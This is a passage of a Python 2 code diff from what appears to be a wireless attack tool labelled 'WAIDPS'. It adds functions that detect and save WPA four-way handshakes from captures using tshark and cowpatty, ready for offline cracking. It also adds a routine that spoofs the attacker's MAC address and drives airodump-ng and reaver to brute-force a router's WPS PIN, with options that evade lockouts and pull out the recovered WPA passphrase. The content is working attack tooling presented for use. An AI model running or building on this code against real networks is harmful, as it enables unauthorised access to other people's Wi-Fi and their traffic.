+                DPART2=str(DPART2).replace(str(ARW),fcolor.SRed + str(ARW) + fcolor.SPink).replace("/",fcolor.SWhite + "/" + fcolor.BWhite).replace("=",fcolor.SWhite + "=" + fcolor.BWhite)
+                M1=int(HANDSHAKE_LIST1R[hsc])
+                M2=int(HANDSHAKE_LIST2R[hsc])
+                M3=int(HANDSHAKE_LIST3R[hsc])
+                M4=int(HANDSHAKE_LIST4R[hsc])
+                Status=""
+                if M1>0 and M2>0 and M3>0 and M4>0:
+                    Status=fcolor.BRed + "  [Full 4 Ways]";FULL4WAY="1"
+                if M1>0 and M2==0 and M3>0 and M4>0:
+                    Status=fcolor.BRed + "  [Partial 3 Ways]"
+                if M1>0 and M2>0 and Status=="":
+                    Status=fcolor.BRed + "  [Msg 1 & 2]"
+                DMIX=str(fcolor.SPink + DPART1 + fcolor.SGreen + DPART2).replace(" ."," ")
+                print tabspacefull + str(DMIX) + fcolor.SCyan + str(OUI) + Status + ""
+                hsc=hsc+1
+        printc (" ",fcolor.SGreen + "1/4 (A>C) = " + fcolor.BWhite + str(HS1) + fcolor.SGreen + "\t\t2/4 (C>A) = " + fcolor.BWhite + str(HS2) + fcolor.SGreen + "\t\t 3/4 (A>C) = " + fcolor.BWhite + str(HS3) + fcolor.SGreen + "\t\t4/4 (C>A) = " + fcolor.BWhite + str(HS4),"")
+        if int(HS1)>0 and int(HS3)>0 and int(HS2)==0 and int(HS4)==0:
+            printc (" ",fcolor.SWhite + "Captured only 2-way handshake AP ==> Client, client could be further away from you to the access point..","")
+        if int(HS1)==0 and int(HS3)==0 and int(HS2)>0 and int(HS4)>0:
+            printc (" ",fcolor.SWhite + "Captured only 2-way handshake Client ==> AP, access point could be further away from you to the client..","")
+    else:
+        printc ("!",fcolor.BRed + "No handshake data found !!","")
+
+def DisplayComplete(TStart):
+    EndTime=Now()
+    Elapse=CalculateTime (TStart,EndTime)
+    printc ("i",fcolor.BGreen + "Time Start : " + fcolor.SWhite + str(TStart),"")
+    printc (" ",fcolor.BGreen + "Time End   : " + fcolor.SWhite + str(EndTime),"")
+    printc (" ",fcolor.BGreen + "Time Spent : " + fcolor.SWhite + str(Elapse),"")
+    print ""
+
+def Find2MACIndex(MACAddr,ListToFind):
+    MACIndex=-1
+    MACLoc=str(ListToFind).find(str(MACAddr))
+    if MACLoc!=-1:
+        MACIndex=int(MACLoc) -2
+        MACIndex=MACIndex/42
+        if ListToFind[MACIndex]!=MACAddr:
+            MACIndex=-1
+    return MACIndex
+
+def CheckHandshake(capfile,TargetMAC,ESSID):
+    HANDSHAKE_LIST1=[]
+    HANDSHAKE_LIST1R=[]
+    HANDSHAKE_LIST2=[]
+    HANDSHAKE_LIST2R=[]
+    HANDSHAKE_LIST3=[]
+    HANDSHAKE_LIST3R=[]
+    HANDSHAKE_LIST4=[]
+    HANDSHAKE_LIST4R=[]
+    ARW=" -> "
+    TargetMAC2=str(TargetMAC).replace(":","")
+    if __builtin__.DB_HSSAVED=="0":
+        PARTIALSAVED=""
+    else:
+        PARTIALSAVED=fcolor.SWhite + "[Non-Strict Handshake Already Saved]"
+    print ""
+    printc (".",fcolor.SWhite + Now() + " - " + fcolor.BGreen + "Checking for four-way handshake... " + str(PARTIALSAVED) + "                              ","")
+    WPA_HANDSHAKE=""
+    eapol="eapol || wlan_mgt.tag.interpretation"
+    cmd = ['tshark','-r',capfile , '-R', eapol, '-n']
+    proc = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+    HS_FOUND=""
+    lines = proc.communicate()[0].split('\n')
+    if str(lines).find("EAPOL")!=-1:
+        HS_FOUND="1"
+    HS1=0
+    HS2=0
+    HS3=0
+    HS4=0
+    SQL=0
+    SQL_MATCH=""
+    linelist=[]
+    for line in lines:
+        FRMAC=""
+        TOMAC=""
+        DTYPE=""
+        MSGC=""
+        line=str(line).replace("  "," ").replace("  "," ").replace("  "," ")
+        linelist=line.split(" ")
+        if len(linelist)>11:
+            FRMAC=str(linelist[2]).upper()
+            TOMAC=str(linelist[4]).upper()
+            DTYPE=str(linelist[5]).upper()
+            MSGC=str(linelist[9]).upper()
+ 
+        if DTYPE=="EAPOL" and str(line).find("(Message ")!=-1:
+            M1=0;M2=0;M3=0;M4=0;AM=""
+            if MSGC=="1":
+                M1=1;AM="1"
+            if MSGC=="2":
+                M2=1;AM="2"
+            if MSGC=="3":
+                M3=1;AM="3"
+            if MSGC=="4":
+                M4=1;AM="4"
+            if MSGC=="1" or MSGC=="3":
+                FRTOMAC=str(FRMAC) + str(ARW) + str(TOMAC) # + "[" + str(AM) + "]"
+                TOFRMAC=str(TOMAC) + str(ARW) + str(FRMAC)
+            if MSGC=="2" or MSGC=="4":
+                TOFRMAC=str(FRMAC) + str(ARW) + str(TOMAC) 
+                FRTOMAC=str(TOMAC) + str(ARW) + str(FRMAC)
+            Result1=Find2MACIndex(FRTOMAC, HANDSHAKE_LIST1)
+            Result2=Find2MACIndex(FRTOMAC, HANDSHAKE_LIST2)
+            if Result1==-1:	
+                HANDSHAKE_LIST1.append (str(FRTOMAC))
+                HANDSHAKE_LIST1R.append (str(M1))
+                HANDSHAKE_LIST3.append (str(FRTOMAC))
+                HANDSHAKE_LIST3R.append (str(M3))
+                HANDSHAKE_LIST2.append (str(TOFRMAC))
+                HANDSHAKE_LIST2R.append (str(M2))
+                HANDSHAKE_LIST4.append (str(TOFRMAC))
+                HANDSHAKE_LIST4R.append (str(M4))
+            else:
+                HANDSHAKE_LIST1R[Result1]=int(HANDSHAKE_LIST1R[Result1]) + int(M1)
+                HANDSHAKE_LIST2R[Result1]=int(HANDSHAKE_LIST2R[Result1]) + int(M2)
+                HANDSHAKE_LIST3R[Result1]=int(HANDSHAKE_LIST3R[Result1]) + int(M3)
+                HANDSHAKE_LIST4R[Result1]=int(HANDSHAKE_LIST4R[Result1]) + int(M4)
+        if str(line).find("(Message 1 of 4)")!=-1:
+            HS1=int(HS1)+1
+            SQL=1
+        if str(line).find("(Message 2 of 4)")!=-1:
+            HS2=int(HS2)+1
+            if SQL==1:
+                SQL=2
+        if str(line).find("(Message 3 of 4)")!=-1:
+            HS3=int(HS3)+1
+            if SQL==2:
+                SQL=3
+        if str(line).find("(Message 4 of 4)")!=-1:
+            HS4=int(HS4)+1
+            if SQL==3:
+                SQL=4;SQL_MATCH="1"
+    cmd = ['cowpatty','-r',capfile , '-s', TargetMAC, '-c']
+    proc = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+    proc.wait()
+    lines = proc.communicate()[0]
+    if HS_FOUND=="1":
+        if __builtin__.DB_HSSAVED=="0":
+            HS_Filename=savedir + "Handshake_" + TargetMAC2 + "_" + str(ESSID)
+            __builtin__.HS_File=HS_Filename + ".cap"
+            __builtin__.HS_FileFull=HS_Filename + "_Full.cap"
+            __builtin__.HS_FileStrict=HS_Filename + "_Strict.cap"
+            __builtin__.HS_FileStrictFull=HS_Filename + "_StrictFull.cap"
+            if IsFileDirExist(__builtin__.HS_File)=="F":
+                cp=1
+                while cp<9999:
+                    __builtin__.HS_File= HS_Filename + "_" + str(cp).zfill(2) + ".cap"
+                    __builtin__.HS_FileFull=HS_Filename + "_" + str(cp).zfill(2) + "_Full.cap"
+                    __builtin__.HS_FileStrict=HS_Filename + "_" + str(cp).zfill(2) + "_Strict.cap"
+                    __builtin__.HS_FileStrictFull=HS_Filename + "_" + str(cp).zfill(2) + "_StrictFull.cap"
+                    if IsFileDirExist(__builtin__.HS_File)!="F":
+                        cp=9999
+                    cp += 1
+    if lines.find("Collected all necessary data to mount")!=-1:
+        if len(HANDSHAKE_LIST1)>0:
+            hsc=0;FULL4WAY=""
+            while hsc<len(HANDSHAKE_LIST1):
+                list=[];OUI=""
+                list=str(HANDSHAKE_LIST1[hsc]).split(" ")
+                CLMAC=str(list[2])
+                OUI=Check_OUI(CLMAC,"")
+                DPART1=str(HANDSHAKE_LIST1[hsc]) + " = " +  str(HANDSHAKE_LIST1R[hsc]) + " / " + str(HANDSHAKE_LIST3R[hsc])
+                DPART1=str(DPART1).ljust(50) + " ."
+                DPART1=str(DPART1).replace(str(ARW),fcolor.SRed + str(ARW) + fcolor.SGreen).replace("/",fcolor.SWhite + "/" + fcolor.BWhite).replace("=",fcolor.SWhite + "=" + fcolor.BWhite)
+                DPART2=str(HANDSHAKE_LIST2[hsc]) + " = " +  str(HANDSHAKE_LIST2R[hsc]) + " / " + str(HANDSHAKE_LIST4R[hsc])
+                DPART2=str(DPART2).ljust(50) + " ."
+                DPART2=str(DPART2).replace(str(ARW),fcolor.SRed + str(ARW) + fcolor.SPink).replace("/",fcolor.SWhite + "/" + fcolor.BWhite).replace("=",fcolor.SWhite + "=" + fcolor.BWhite)
+                M1=int(HANDSHAKE_LIST1R[hsc])
+                M2=int(HANDSHAKE_LIST2R[hsc])
+                M3=int(HANDSHAKE_LIST3R[hsc])
+                M4=int(HANDSHAKE_LIST4R[hsc])
+                Status=""
+                if M1>0 and M2>0 and M3>0 and M4>0:
+                    Status=fcolor.BRed + "  [Full 4 Ways]";FULL4WAY="1"
+                if M1>0 and M2==0 and M3>0 and M4>0:
+                    Status=fcolor.BRed + "  [Partial 3 Ways]"
+                if M1>0 and M2>0 and Status=="":
+                    Status=fcolor.BRed + "  [Msg 1 & 2]"
+                DMIX=str(fcolor.SPink + DPART1 + fcolor.SGreen + DPART2).replace(" ."," ")
+                print tabspacefull + str(DMIX) + fcolor.SCyan + str(OUI) + Status + ""
+                hsc=hsc+1
+        printc (" ",fcolor.SGreen + "1/4 (A>C) = " + fcolor.BWhite + str(HS1) + fcolor.SGreen + "\t\t2/4 (C>A) = " + fcolor.BWhite + str(HS2) + fcolor.SGreen + "\t\t 3/4 (A>C) = " + fcolor.BWhite + str(HS3) + fcolor.SGreen + "\t\t4/4 (C>A) = " + fcolor.BWhite + str(HS4),"")
+        if int(HS1)>0 and int(HS3)>0 and int(HS2)==0 and int(HS4)==0:
+            printc (" ",fcolor.SWhite + "Captured only 2-way handshake AP ==> Client, client could be further away from you to the access point..","")
+        if int(HS1)==0 and int(HS3)==0 and int(HS2)>0 and int(HS4)>0:
+            printc (" ",fcolor.SWhite + "Captured only 2-way handshake Client ==> AP, access point could be further away from you to the client..","")
+        eapol="eapol || wlan_mgt.tag.interpretation || (wlan.fc.type_subtype==0x08)"
+        if __builtin__.DB_HSSAVED=="0":
+            printc ("i",fcolor.BCyan + "Handshake Found !!  Saving Handshake ....","")
+            printc (" ",fcolor.SGreen + "1/4 = " + fcolor.BWhite + str(HS1) + fcolor.SGreen + "\t\t2/4 = " + fcolor.BWhite + str(HS2) + fcolor.SGreen + "\t\t3/4 = " + fcolor.BWhite + str(HS3) + fcolor.SGreen + "\t\t4/4 = " + fcolor.BWhite + str(HS4),"")
+            __builtin__.DB_HSSAVED="1";WPA_HANDSHAKE=""
+            if IsProgramExists("wpaclean")==True:
+                cmd = ['wpaclean',__builtin__.HS_File,capfile]
+            else:
+                cmd = ['tshark','-r',capfile , '-R', eapol, '-w',__builtin__.HS_File]
+            proc = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+            proc.wait()
+            if IsFileDirExist(capfile)=="F":
+                if IsFileDirExist(__builtin__.HS_FileFull)=="F":
+                    DelFile(__builtin__.HS_FileFull,"")
+                shutil.copy2(capfile, __builtin__.HS_FileFull)
+            print ""
+            if IsFileDirExist(__builtin__.HS_File)=="F":
+                statinfo = os.stat(__builtin__.HS_File)
+                if statinfo.st_size!=0:
+                    GetFileDetail(__builtin__.HS_File)
+                    FS=fcolor.SWhite + "[ " + fcolor.SGreen + "Filesize : " + fcolor.SWhite + str(__builtin__.FileSize) + " ]"
+                    printc ("i",fcolor.SGreen + "Trimmed Handshake file [Non Strict] successfully saved to " + fcolor.BRed + __builtin__.HS_File + "  " + FS,"") 
+                    if IsFileDirExist(__builtin__.HS_FileFull)=="F":
+                        statinfo = os.stat(__builtin__.HS_FileFull)
+                        if statinfo.st_size!=0:
+                             GetFileDetail(__builtin__.HS_FileFull)
+                             FS=fcolor.SWhite + "[ " + fcolor.SGreen + "Filesize : " + fcolor.SWhite + str(__builtin__.FileSize) + " ]"
+                             printc ("i",fcolor.SGreen + "Full-size packet dump [Non Strict] saved saved to " + fcolor.BRed + __builtin__.HS_FileFull + "  " + FS,"") 
+                             print ""
+                else:
+                    printc ("!",fcolor.BRed + "Handshake file saving failed !!" ,"")
+                    printc ("x","","")
+                    LineBreak()
+        if __builtin__.DB_HSSAVED=="1" and SQL_MATCH!="1" and HS1>0 and HS2>0 and HS3>0 and HS4>0:
+            if FULL4WAY=="1":
+                SQL_MATCH="1"
+        if __builtin__.DB_HSSAVED=="1" and SQL_MATCH=="1":
+            WPA_HANDSHAKE="1"
+            printc ("i",fcolor.BCyan + "Four Handshake Found [Strict 4/4] !!  Saving Handshake ....","")
+            printc (" ",fcolor.SGreen + "1/4 = " + fcolor.BWhite + str(HS1) + fcolor.SGreen + "\t\t2/4 = " + fcolor.BWhite + str(HS2) + fcolor.SGreen + "\t\t3/4 = " + fcolor.BWhite + str(HS3) + fcolor.SGreen + "\t\t4/4 = " + fcolor.BWhite + str(HS4),"")
+            if IsProgramExists("wpaclean")==True:
+                cmd = ['wpaclean',__builtin__.HS_FileStrict,capfile]
+            else:
+                cmd = ['tshark','-r',capfile , '-R', eapol, '-w',__builtin__.HS_FileStrict]
+            proc = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+            proc.wait()
+            if IsFileDirExist(capfile)=="F":
+                if IsFileDirExist(__builtin__.HS_FileStrictFull)=="F":
+                    DelFile(__builtin__.HS_FileStrictFull,"")
+                shutil.copy2(capfile, __builtin__.HS_FileStrictFull)
+            print ""
+            if IsFileDirExist(__builtin__.HS_FileStrict)=="F":
+                statinfo = os.stat(__builtin__.HS_FileStrict)
+                if statinfo.st_size!=0:
+                    GetFileDetail(__builtin__.HS_FileStrict)
+                    FS=fcolor.SWhite + "[ " + fcolor.SGreen + "Filesize : " + fcolor.SWhite + str(__builtin__.FileSize) + " ]"
+                    printc (" ",fcolor.SGreen + "Trimmed Handshake file [Strict 4/4] successfully saved to " + fcolor.BRed + __builtin__.HS_FileStrict + "  " + FS,"") 
+                    if IsFileDirExist(__builtin__.HS_FileStrictFull)=="F":
+                        statinfo = os.stat(__builtin__.HS_FileStrictFull)
+                        if statinfo.st_size!=0:
+                             GetFileDetail(__builtin__.HS_FileStrictFull)
+                             FS=fcolor.SWhite + "[ " + fcolor.SGreen + "Filesize : " + fcolor.SWhite + str(__builtin__.FileSize) + " ]"
+                             printc (" ",fcolor.SGreen + "Full-size packet dump [Strict 4/4] saved saved to " + fcolor.BRed + __builtin__.HS_FileStrictFull + "  " + FS,"") 
+                else:
+                    printc ("!",fcolor.BRed + "Handshake file saving failed !!" ,"")
+                    printc ("x","","")
+                    LineBreak()
+        if __builtin__.DB_HSSAVED=="1" and SQL_MATCH=="0":
+            printc ("i",fcolor.SCyan + "Non-Strict Four-way Handshake Already Saved ....","")
+    else:
+        if HS_FOUND=="1":
+            printc ("!",fcolor.SRed + "Incomplete Handshake Found !!!" + str(PARTIALSAVED) + "\n","")
+            FULL4WAY=0
+            if len(HANDSHAKE_LIST1)>0:
+                hsc=0
+                while hsc<len(HANDSHAKE_LIST1):
+                    list=[];OUI=""
+                    list=str(HANDSHAKE_LIST1[hsc]).split(" ")
+                    CLMAC=str(list[2])
+                    OUI=Check_OUI(CLMAC,"")
+                    DPART1=str(HANDSHAKE_LIST1[hsc]) + " = " +  str(HANDSHAKE_LIST1R[hsc]) + " / " + str(HANDSHAKE_LIST3R[hsc])
+                    DPART1=str(DPART1).ljust(50) + " ."
+                    DPART1=str(DPART1).replace(str(ARW),fcolor.SRed + str(ARW) + fcolor.SGreen).replace("/",fcolor.SWhite + "/" + fcolor.BWhite).replace("=",fcolor.SWhite + "=" + fcolor.BWhite)
+                    DPART2=str(HANDSHAKE_LIST2[hsc]) + " = " +  str(HANDSHAKE_LIST2R[hsc]) + " / " + str(HANDSHAKE_LIST4R[hsc])
+                    DPART2=str(DPART2).ljust(50) + " ."
+                    DPART2=str(DPART2).replace(str(ARW),fcolor.SRed + str(ARW) + fcolor.SPink).replace("/",fcolor.SWhite + "/" + fcolor.BWhite).replace("=",fcolor.SWhite + "=" + fcolor.BWhite)
+                    M1=int(HANDSHAKE_LIST1R[hsc])
+                    M2=int(HANDSHAKE_LIST2R[hsc])
+                    M3=int(HANDSHAKE_LIST3R[hsc])
+                    M4=int(HANDSHAKE_LIST4R[hsc])
+                    Status=""
+                    if M1>0 and M2>0 and M3>0 and M4>0:
+                        Status=fcolor.BRed + "  [Full 4 Ways]";FULL4WAY="1"
+                    if M1>0 and M2==0 and M3>0 and M4>0:
+                        Status=fcolor.BRed + "  [Partial 3 Ways]"
+                    if M1>0 and M2>0 and Status=="":
+                        Status=fcolor.BRed + "  [Msg 1 & 2]"
+                    DMIX=str(fcolor.SPink + DPART1 + fcolor.SGreen + DPART2).replace(" ."," ")
+                    print tabspacefull + str(DMIX) + fcolor.SCyan + str(OUI) + Status + ""
+                    hsc=hsc+1
+            printc (" ",fcolor.SGreen + "1/4 (A>C) = " + fcolor.BWhite + str(HS1) + fcolor.SGreen + "\t\t2/4 (C>A) = " + fcolor.BWhite + str(HS2) + fcolor.SGreen + "\t\t 3/4 (A>C) = " + fcolor.BWhite + str(HS3) + fcolor.SGreen + "\t\t4/4 (C>A) = " + fcolor.BWhite + str(HS4),"")
+            if int(HS1)>0 and int(HS3)>0 and int(HS2)==0 and int(HS4)==0:
+                printc (" ",fcolor.SWhite + "Captured only 2-way handshake AP ==> Client, client could be further away from you to the access point..","")
+            if int(HS1)==0 and int(HS3)==0 and int(HS2)>0 and int(HS4)>0:
+                printc (" ",fcolor.SWhite + "Captured only 2-way handshake Client ==> AP, access point could be further away from you to the client..","")
+            LineBreak()
+        else:
+            printc ("!",fcolor.SRed + "No Handshake Found !!\n","")
+    return WPA_HANDSHAKE
+
+def WPSAddOnPara(Para,Header):
+    if Header!="":
+        printc ("i",fcolor.BGreen + "WPS Bruteforcing Advanced Options","")
+        printc (" ",fcolor.SWhite + "This option allow user to specify additional WPS bruteforcing options. To enable/disable the option, simply enter the command to toggle.","")
+    print ""
+    printc (" ",fcolor.SGreen + "Parameter : " + fcolor.BWhite + str(Para),"")
+    usr_resp=AskQuestion("Enter options",fcolor.BRed + "OK" + fcolor.SGreen + "-Exit / " + fcolor.BRed + "HELP" + fcolor.SGreen + "-Display options","L"," ","1")
+    if usr_resp==" ":
+        WPSAddOnPara(Para,"")
+        return
+    if usr_resp=="ok":
+        return Para
+    if usr_resp=="help":
+        LineBreak()
+        MSG=""
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--pin=" + fcolor.SYellow + "<wps pin>\t\t" + fcolor.SWhite + "Use the specified 4 or 8 digit WPS pin\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--delay=" + fcolor.SYellow + "<seconds>\t\t" + fcolor.SWhite + "Set the delay between pin attempts.\t\t\t" + fcolor.SGreen + "[Default is 1]\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--lock-delay=" + fcolor.SYellow + "<seconds>\t" + fcolor.SWhite + "Set the time to wait if the AP locks WPS pin attempts.\t" + fcolor.SGreen + "[Default is 60]\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--max-attempts==" + fcolor.SYellow + "<num>\t" + fcolor.SWhite + "Quit after num pin attempts\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--fail-wait=" + fcolor.SYellow + "<seconds>\t" + fcolor.SWhite + "Set the time to sleep after 10 unexpected failures.\t" + fcolor.SGreen + "[Default is 60]\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--recurring-delay=" + fcolor.SYellow + "<x:y> \t" + fcolor.SWhite + "Sleep for y seconds every x pin attempts\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--timeout=" + fcolor.SYellow + "<seconds>\t" + fcolor.SWhite + "Set the receive timeout period.\t\t\t\t" + fcolor.SGreen + "[Default is 60]\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--m57-timeout=" + fcolor.SYellow + "<seconds>\t" + fcolor.SWhite + "Set the M5/M7 timeout period.\t\t\t\t" + fcolor.SGreen + "[Default is 0.20]\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--no-associate" + fcolor.SYellow + "\t\t" + fcolor.SWhite + "Do not associate with the AP (association must be done by another application)\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--no-nacks" + fcolor.SYellow + "\t\t" + fcolor.SWhite + "Do not send NACK messages when out of order packets are received\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--dh-smalls" + fcolor.SYellow + "\t\t" + fcolor.SWhite + "Use small DH keys to improve crack speed\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--ignore-locks" + fcolor.SYellow + "\t\t" + fcolor.SWhite + "Ignore locked state reported by the target AP\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--eap-terminate" + fcolor.SYellow + "\t\t" + fcolor.SWhite + "Terminate each WPS session with an EAP FAIL packet\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--nack" + fcolor.SYellow + "\t\t\t" + fcolor.SWhite + "Target AP always sends a NACK\n"
+        MSG=MSG + tabspacefull + fcolor.BYellow + "--win7" + fcolor.SYellow + "\t\t\t" + fcolor.SWhite + "Mimic a Windows 7 registrar "
+        printc ("i",fcolor.BWhite + "Advanced Options Help","")
+        print MSG
+        LineBreak()
+        WPSAddOnPara(Para,"")
+        return
+
+def AttackWPSProc(TargetMAC,TargetChannel,ClentList,Auto):
+    retkey="";DAUTHCT=5
+    DelFile (tmpdir + "tmp-capture*.*","")
+    TargetMAC2=str(TargetMAC).replace(":","")
+    printc ("i",fcolor.BBlue + "WPS Enabled Router Auditing","")
+    printc (" ",fcolor.SWhite + "Application will be testing the selected WPS enabled Access Point.","")
+    WPS_CRACKED=""
+    __builtin__.WPS_File=tmpdir + "WPS_" + str(TargetMAC2) + "_TMP.dump"
+    __builtin__.WPS_File2=tmpdir + "WPS_" + str(TargetMAC2) + "_TMP2.dump"
+    os.chdir(tmpdir)
+    if len(__builtin__.CUR_CLIENT)>0:
+        ListClientFound()
+    Result=ChangeMACAddr(__builtin__.SELECTED_ATK,__builtin__.SELECTED_IFACE)
+    LineBreak()
+    CH5GHZ=""
+    if int(__builtin__.ATTACK_AP_CH)>14:
+        CH5GHZ=" -5"
+    Para=CH5GHZ + "--dh-small --win7 "
+    printc (" ",fcolor.BRed + "1" + fcolor.SWhite + " - Non Aggresive Mode (Slow - Help prevent locking on some AP","")
+    printc (" ",fcolor.BRed + "2" + fcolor.SWhite + " - Aggresive Mode (Fast - Only useful on non-lockable AP","")
+    usr_resp=AskQuestion(fcolor.BGreen + "Select an option ","1/2 " + fcolor.SWhite + "Default - " + fcolor.BRed + "1" ,"U","1","1")
+    if usr_resp=="2":
+        Para=CH5GHZ + "--dh-small --win7 "
+    if usr_resp=="1":
+        Para=CH5GHZ + "--dh-small --nack --eap-terminate --win7 -r 3:180 -d 3"
+    print "Para : " + str(Para)
+    __builtin__.TStart=Now()
+    printc ("i",fcolor.BGreen + "Time Start : " + fcolor.SWhite + str(__builtin__.TStart),"")
+    print ""
+    printc (".",fcolor.SWhite + Now() + " - " + fcolor.SGreen + "Starting WPS Attack for Access Point [ " + fcolor.SYellow +str(TargetMAC) + fcolor.BGreen + " ]..","")
+    cmdLine="xterm -geometry 100x20-0-200 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Sniffing Packet' -e 'airodump-ng --bssid " + TargetMAC  + " -c" + str(TargetChannel) + " -w " + tmpdir + "tmp-capture" + " " + str(__builtin__.SELECTED_ATK) + " | tee " + tmpdir + "SNIF_RESULT.txt" + "'"
+    ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+    __builtin__.Sniffer=ps.pid
+    cmdLine="xterm -geometry 100x10-0-200 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing WPS [" + str(TargetMAC) + "' -e 'reaver -i " + str(__builtin__.SELECTED_ATK) + " -b " + str(__builtin__.ATTACK_AP_BSSID) + str(CH5GHZ) + " -c " + str(__builtin__.ATTACK_AP_CH) + str(Para) + " -a -vv -o " + str(__builtin__.WPS_File) + " | tee " + tmpdir + "WPS_Result.txt'" 
+    print "cmdLine : " + str(cmdLine)
+    ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+    __builtin__.ProcID=ps.pid
+    __builtin__.ProcID=WEPAttackMode("AAPC","","1")
+    DelFile (tmpdir + "tmp-capture*.cap","")
+    while WPS_CRACKED=="":
+        rlist=[]
+        if IsFileDirExist(__builtin__.WPS_File)=="F":
+            if IsFileDirExist(__builtin__.WPS_File2)=="F":
+                with open(__builtin__.WPS_File2,"r") as f:
+                    for line in f:
+                        if str(line).find("Trying pin")!=-1:
+                            rlist=str(line).split(" ")
+                            WPS_PIN=str(rlist[3]).replace("\n","")
+                            DMSG=fcolor.SWhite + "\n[.]   " + Now() + " - " + fcolor.BWhite + "Trying manually entered WPS PIN " + fcolor.BRed + str(WPS_PIN) +  fcolor.BWhite + "...."
+                            print DMSG
+                        if str(line).find("Failed to recover WPA key")!=-1:
+                            DMSG="\n" + tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.BWhite + "Failed to recover encryption key with the manually entered WPS PIN [ " + fcolor.BRed + str(PIN) + fcolor.BWhite + " ].." + "\n"
+                            print DMSG
+                            PIN=""
+                            DelFile (__builtin__.WPS_File2,"")
+                        if str(line).find("WPS PIN: '")!=-1:
+                            PIN=str(line)[14:-1]
+                            PIN=str(PIN).replace("'","")
+                        if str(line).find("WPA PSK: '")!=-1:
+                            DMSG="\n" + tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.BWhite + "Manaully entered WPS PIN [ " + fcolor.BRed + str(PIN) + fcolor.BWhite + " ] matched..." + "\n"
+                            if IsFileDirExist(__builtin__.WPS_File)=="F" and IsFileDirExist(__builtin__.WPS_File2)=="F":
+                                DelFile (tmpdir + __builtin__.WPS_File,"")
+                            shutil.copy2(__builtin__.WPS_File2, __builtin__.WPS_File)
+                            DelFile (tmpdir + __builtin__.WPS_File2,"")
+                            print DMSG
+                open(__builtin__.WPS_File2,"w").write("")
+                      
+            LINEFOUND=""
+            with open(__builtin__.WPS_File,"r") as f:
+                for line in f:
+                    DMSG=""
+                    line=line.replace("\n","").replace("\00","")
+                    if line!="":
+                        LINEFOUND="1"
+                        if str(line).find("Failed to associate with")!=-1:
+                            rlist=str(line).split(" ")
+                            WPS_BSSID=rlist[6]
+                            WPS_ESSID=""
+                            EPos=str(line).index("(ESSID:")
+                            if EPos>0:
+                                EPos=EPos+8
+                                WPS_ESSID=str(line)[EPos:-1].lstrip().rstrip()
+                                if WPS_ESSID!="":
+                                    LWPS_ESSID=fcolor.SRed + " ESSID : " + fcolor.SPink + str(WPS_ESSID)
+                            DMSG=tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SRed + "Failed Associated to " + fcolor.SYellow + str(WPS_BSSID) + str(str(LWPS_ESSID)) + fcolor.SRed + "...."
+                        if str(line).find("Associated with")!=-1:
+                            rlist=str(line).split(" ")
+                            WPS_BSSID=rlist[3]
+                            WPS_ESSID=""
+                            EPos=str(line).index("(ESSID:")
+                            if EPos>0:
+                                EPos=EPos+8
+                                WPS_ESSID=str(line)[EPos:-1].lstrip().rstrip()
+                                if WPS_ESSID!="":
+                                    LWPS_ESSID=fcolor.SGreen + " ESSID : " + fcolor.SPink + str(WPS_ESSID)
+                            DMSG=tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SGreen + "Associated with " + fcolor.SYellow + str(WPS_BSSID) + str(str(LWPS_ESSID)) + fcolor.SGreen + "...."
+                        if str(line).find("Waiting for beacon from")!=-1:
+                            rlist=str(line).split(" ")
+                            WPS_BSSID=rlist[5]
+                            DMSG=tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SGreen + "Waiting for beacon from " + fcolor.SYellow + str(WPS_BSSID) +  fcolor.SGreen + "...."
+                        if str(line).find("WPS transaction failed")!=-1:
+                            line=str(line).replace("[!] ","").replace("[+] ","")
+                            DMSG=tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SRed + str(line) + "\n"
+                        if str(line).find("timeout occurred")!=-1:
+                            line=str(line).replace("[!] ","").replace("[+] ","")
+                            DMSG=tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SWhite + str(line) + "\n"
+                        if str(line).find(" complete @")!=-1:
+                            line=str(line).replace("[!] ","").replace("[+] ","")
+                            line=str(line).replace("complete @","complete " + fcolor.SGreen + " @")
+                            rlist=str(line).split(" ")
+                            WPS_COMPLETE=rlist[0]
+                            DMSG=tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.BPink + str(line) + "\n"
+                        if str(line).find("Max time remaining")!=-1:
+                            line=str(line).replace("[!] ","").replace("[+] ","")
+                            line=str(line).replace("at this rate:","at this rate:" + fcolor.BGreen)
+                            rlist=str(line).split(" ")
+                            WPS_COMPLETE=rlist[0]
+                            DMSG=tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SGreen + str(line) + "\n"
+                        if str(line).find("Trying pin")!=-1:
+                            rlist=str(line).split(" ")
+                            WPS_PIN=rlist[3]
+                            DMSG=fcolor.SWhite + "[.]   " + Now() + " - " + fcolor.BGreen + "Trying PIN " + fcolor.BRed + str(WPS_PIN) +  fcolor.BGreen + "....\n"
+                        if DMSG=="" and line!="":
